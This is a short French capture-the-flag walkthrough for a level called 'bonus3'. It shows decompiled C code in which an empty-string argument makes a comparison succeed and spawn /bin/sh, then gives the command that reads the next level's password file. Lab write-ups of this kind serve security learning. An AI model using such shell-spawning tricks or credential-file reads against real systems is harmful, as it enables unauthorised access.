### Bonus 3

#### Etape 01 :

On inspecte le code source et on trouve la ligne suivante :

```c
buf[atoi(argv[1])] = 0;
```

Ensuite, le programme compare `buf` et `argv[1]` :

```c
if (strcmp(&buf, argv[1]))
    puts(&var_56);
else
    execl("/bin/sh", "sh", 0);
```

Conclusion : si les deux chaînes sont identiques, le programme ouvre un shell.

#### Etape 02 :

Il suffit donc de lancer le binaire avec une chaîne vide :

```bash
./bonus3 ""
```

Dans ce cas, `argv[1]` vaut `\0`, et `buf[0] = 0` aussi. Les deux valeurs deviennent identiques, ce qui déclenche `execl("/bin/sh", "sh", 0)`.

Une fois dans le shell, il reste à récupérer le mot de passe :

```bash
whoami
cat /home/user/end/.pass
```